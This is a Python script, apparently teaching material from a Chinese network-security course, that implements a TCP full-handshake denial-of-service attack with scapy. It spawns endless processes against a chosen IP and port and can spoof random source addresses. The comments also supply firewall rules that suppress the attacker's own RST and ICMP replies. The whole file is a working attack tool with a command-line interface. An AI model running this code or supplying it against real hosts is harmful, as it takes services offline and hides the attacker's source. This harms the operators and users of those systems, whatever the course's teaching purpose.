#!/usr/bin/python3.4
# -*- coding=utf-8 -*-
#本脚由亁颐堂现任明教教主编写，用于乾颐盾Python课程！
#教主QQ:605658506
#亁颐堂官网www.qytang.com
#乾颐盾是由亁颐堂现任明教教主开发的综合性安全课程
#包括传统网络安全（防火墙，IPS...）与Python语言和黑客渗透课程！

#firewall-cmd --direct --add-rule ipv4 filter OUTPUT 1 -p tcp --tcp-flags RST RST -s 202.100.1.139 -j DROP
#firewall-cmd --direct --add-rule ipv4 filter OUTPUT 1 -p icmp -s 202.100.1.139 -j DROP

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)#清除报错
from scapy.all import *
from handshake import handshake#导入三次TCP握手方法
from handshake_random import handshake_random#导入随机伪装源IP地址，三次TCP握手方法
import multiprocessing#导入多进程模块

def handshake_dos(ip, port, random=False):#定义全连接DoS方法，传入目的IP地址，目的端口号，默认不激活随机伪装源IP地址功能
	if random == False:#如果不随机伪装源IP地址
		while True:#一直执行攻击，直到ctl+c终止程序
			#产生全新的进程执行攻击，目标函数为handshake，参数为IP（目的IP地址）和port（目的端口号）
			handshake_attack = multiprocessing.Process(target=handshake, args=(ip, port))
			#开始进程
			handshake_attack.start()
	else:#如果激活随机伪装源IP地址
		while True:#一直执行攻击，直到ctl+c终止程序
			#产生全新的进程执行攻击，目标函数为handshake_random，参数为IP（目的IP地址）和port（目的端口号）
			handshake_random_attack = multiprocessing.Process(target=handshake_random, args=(ip, port))
			#开始进程
			handshake_random_attack.start()	
	
if __name__ == '__main__':
	import optparse#导入选项分析模块
	#配置帮助
	parser = optparse.OptionParser("程序使用方法介绍: -d <目标地址> -p <目标端口> -r <1:激活 2:不激活（默认）>")
	#选项‘-d’，指定目的IP地址
	parser.add_option('-d', dest = 'dst_ip', type = 'string', help = '指定目标地址')
	#选项‘-p’，指定目的端口号
	parser.add_option('-p', dest = 'dst_port', type = 'int', help = '指定目标端口')
	#选项‘-r’，是否激活随机伪装源IP地址
	parser.add_option('-r', dest = 'random', type = 'int', help = '是否激活随机IP')
	#分析参数，得到Options
	(options, args) = parser.parse_args()
	#如果没有指定目的IP，或者没有指定目的端口号，显示帮助信息给客户看！
	if (options.dst_ip == None) or (options.dst_port == None):
		print(parser.usage)
		exit(0)
	else:#如果客户指定了目的地址和目的端口号，为变量赋值！
		destination_ip = options.dst_ip
		destination_port = options.dst_port
	if options.random == 1:#如果客户激活随机伪装源IP地址
		handshake_dos(destination_ip, destination_port, random = True)
	else:#客户不激活随机伪装源IP地址
		handshake_dos(destination_ip, destination_port)



